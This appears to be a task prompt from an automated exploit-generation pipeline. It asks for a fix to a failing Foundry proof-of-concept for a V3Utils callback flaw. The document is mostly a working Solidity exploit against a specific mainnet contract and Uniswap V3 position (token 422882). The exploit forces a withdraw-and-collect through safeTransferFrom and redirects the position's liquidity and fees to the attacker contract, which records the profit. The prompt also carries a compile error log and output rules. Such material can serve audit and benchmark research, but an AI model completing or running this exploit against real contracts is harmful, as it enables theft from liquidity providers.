You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Any approved NFT operator can force callback execution and drain a position's withdrawable value
- claim: `onERC721Received` only checks that the NFT came from the Uniswap position manager, then blindly decodes and executes arbitrary `Instructions` against the transferred position before returning the NFT to `from`. It never verifies that the owner initiated the transfer or that the flow came through `execute()`. Because any address approved for the position NFT can call `nonfungiblePositionManager.safeTransferFrom(owner, address(this), tokenId, abi.encode(instructions))`, an approved operator can force `WITHDRAW_AND_COLLECT_AND_SWAP`, `COMPOUND_FEES`, or `CHANGE_RANGE` with attacker-chosen parameters and attacker-controlled `instructions.recipient`.
- impact: Any marketplace, delegated manager, or other approved operator can steal all currently withdrawable liquidity and fees from a victim Uniswap V3 position without retaining custody of the NFT: the victim receives the NFT back after execution, but the tokens have already been redirected.
- exploit_paths: ["Victim grants `approve(tokenId)` or `setApprovalForAll` on their Uniswap V3 position NFT to an external operator.", "The operator calls `nonfungiblePositionManager.safeTransferFrom(owner, address(V3Utils), tokenId, abi.encode(instructions))` directly, setting `instructions.recipient` to an attacker-controlled address and choosing a draining action.", "`V3Utils` decreases liquidity, collects fees, optionally swaps, and pays the resulting tokens to the attacker before returning the now-depleted NFT to `from`."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
}

interface INonfungiblePositionManagerMinimal {
    function ownerOf(uint256 tokenId) external view returns (address);

    function getApproved(uint256 tokenId) external view returns (address);

    function isApprovedForAll(address owner, address operator) external view returns (bool);

    function positions(uint256 tokenId)
        external
        view
        returns (
            uint96 nonce,
            address operator,
            address token0,
            address token1,
            uint24 fee,
            int24 tickLower,
            int24 tickUpper,
            uint128 liquidity,
            uint256 feeGrowthInside0LastX128,
            uint256 feeGrowthInside1LastX128,
            uint128 tokensOwed0,
            uint128 tokensOwed1
        );

    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) external;
}

contract FlawVerifier {
    enum WhatToDo {
        CHANGE_RANGE,
        WITHDRAW_AND_COLLECT_AND_SWAP,
        COMPOUND_FEES
    }

    struct Instructions {
        WhatToDo whatToDo;
        address targetToken;
        uint256 amountIn0;
        uint256 amountOut0Min;
        bytes swapData0;
        uint256 amountIn1;
        uint256 amountOut1Min;
        bytes swapData1;
        uint128 feeAmount0;
        uint128 feeAmount1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint128 liquidity;
        uint256 amountAddMin0;
        uint256 amountAddMin1;
        uint256 deadline;
        address recipient;
        bool unwrap;
        bytes returnData;
        bytes swapAndMintReturnData;
    }

    address internal constant TARGET = 0x531110418d8591C92e9cBBFC722Db8FFb604FAFD;
    address internal constant POSITION_MANAGER = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 internal constant CANDIDATE_TOKEN_ID = 422882;

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public attempted;
    bool public exploitSucceeded;
    bool public approvalObserved;
    address public observedOwner;
    address public observedApprovedOperator;
    bool public observedApprovalForAll;
    bytes public lastError;

    constructor() {
        _profitToken = WETH;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (attempted) {
            _syncProfit(address(0), address(0), 0, 0);
            return;
        }
        attempted = true;

        _attemptApprovedOperatorDrain(CANDIDATE_TOKEN_ID);
    }

    function _attemptApprovedOperatorDrain(uint256 tokenId) internal {
        (
            address owner,
            address token0,
            address token1,
            address targetToken,
            uint128 liquidity,
            bool hasWithdrawableValue
        ) = _readOpportunity(tokenId);

        observedOwner = owner;
        observedApprovedOperator = INonfungiblePositionManagerMinimal(POSITION_MANAGER).getApproved(tokenId);
        observedApprovalForAll =
            owner != address(0) && INonfungiblePositionManagerMinimal(POSITION_MANAGER).isApprovedForAll(owner, address(this));
        approvalObserved = observedApprovedOperator == address(this) || observedApprovalForAll;

        if (!hasWithdrawableValue) {
            lastError = abi.encodePacked("candidate position has no withdrawable value");
            _syncProfit(token0, token1, 0, 0);
            return;
        }

        uint256 before0 = _balanceOf(token0);
        uint256 before1 = token1 == token0 ? before0 : _balanceOf(token1);

        // Exploit path 0:
        // Victim grants `approve(tokenId)` or `setApprovalForAll` on the Uniswap V3 position NFT
        // to an external operator. This verifier only uses an already-existing approval on-chain.
        //
        // Exploit path 1:
        // The operator calls `safeTransferFrom(owner, address(V3Utils), tokenId, abi.encode(instructions))`
        // directly and sets `instructions.recipient` to the attacker-controlled verifier.
        //
        // Exploit path 2:
        // V3Utils decreases liquidity, collects fees, optionally swaps, and returns the NFT to `from`
        // after forwarding the withdrawn value to `instructions.recipient`.
        //
        // Empty swap payloads are deliberate. In V3Utils, any unswapped token balances are still
        // transferred to `instructions.recipient`, so the drain succeeds without off-chain quote data.
        Instructions memory instructions = Instructions({
            whatToDo: WhatToDo.WITHDRAW_AND_COLLECT_AND_SWAP,
            targetToken: targetToken,
            amountIn0: 0,
            amountOut0Min: 0,
            swapData0: "",
            amountIn1: 0,
            amountOut1Min: 0,
            swapData1: "",
            feeAmount0: type(uint128).max,
            feeAmount1: type(uint128).max,
            fee: 0,
            tickLower: 0,
            tickUpper: 0,
            liquidity: liquidity,
            amountAddMin0: 0,
            amountAddMin1: 0,
            deadline: block.timestamp,
            recipient: address(this),
            unwrap: false,
            returnData: "",
            swapAndMintReturnData: ""
        });

        (bool ok, bytes memory err) = POSITION_MANAGER.call(
            abi.encodeWithSelector(
                INonfungiblePositionManagerMinimal.safeTransferFrom.selector,
                owner,
                TARGET,
                tokenId,
                abi.encode(instructions)
            )
        );

        exploitSucceeded = ok;
        if (!ok) {
            lastError = err;
        }

        _syncProfit(token0, token1, before0, before1);
    }

    function _readOpportunity(uint256 tokenId)
        internal
        view
        returns (
            address owner,
            address token0,
            address token1,
            address targetToken,
            uint128 liquidity,
            bool hasWithdrawableValue
        )
    {
        owner = INonfungiblePositionManagerMinimal(POSITION_MANAGER).ownerOf(tokenId);

        (
            ,
            ,
            token0,
            token1,
            ,
            ,
            ,
            liquidity,
            ,
            ,
            uint128 tokensOwed0,
            uint128 tokensOwed1
        ) = INonfungiblePositionManagerMinimal(POSITION_MANAGER).positions(tokenId);

        if (token0 == WETH) {
            targetToken = token0;
        } else if (token1 == WETH) {
            targetToken = token1;
        } else {
            targetToken = token0;
        }

        hasWithdrawableValue = liquidity != 0 || tokensOwed0 != 0 || tokensOwed1 != 0;
    }

    function _syncProfit(address token0, address token1, uint256 before0, uint256 before1) internal {
        uint256 currentTracked = _balanceOf(_profitToken);

        if (token0 == address(0) && token1 == address(0)) {
            _profitAmount = currentTracked;
            return;
        }

        uint256 after0 = _balanceOf(token0);
        uint256 delta0 = after0 > before0 ? after0 - before0 : 0;

        uint256 delta1;
        if (token1 != address(0)) {
            uint256 after1 = token1 == token0 ? after0 : _balanceOf(token1);
            delta1 = after1 > before1 ? after1 - before1 : 0;
        }

        if (delta1 > delta0) {
            _profitToken = token1;
            _profitAmount = delta1;
        } else {
            _profitToken = token0 == address(0) ? _profitToken : token0;
            _profitAmount = delta0;
        }
    }

    function _balanceOf(address token) internal view returns (uint256) {
        if (token == address(0)) {
            return 0;
        }
        return IERC20Minimal(token).balanceOf(address(this));
    }
}

```

forge stdout (tail):
```
Compiler run failed:
Error (2314): Expected ',' but got identifier
   --> src/FlawVerifier.sol:212:21:
    |
212 |             uint128 tokensOwed0,
    |                     ^^^^^^^^^^^


```

forge stderr (tail):
```
Error: Compilation failed

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
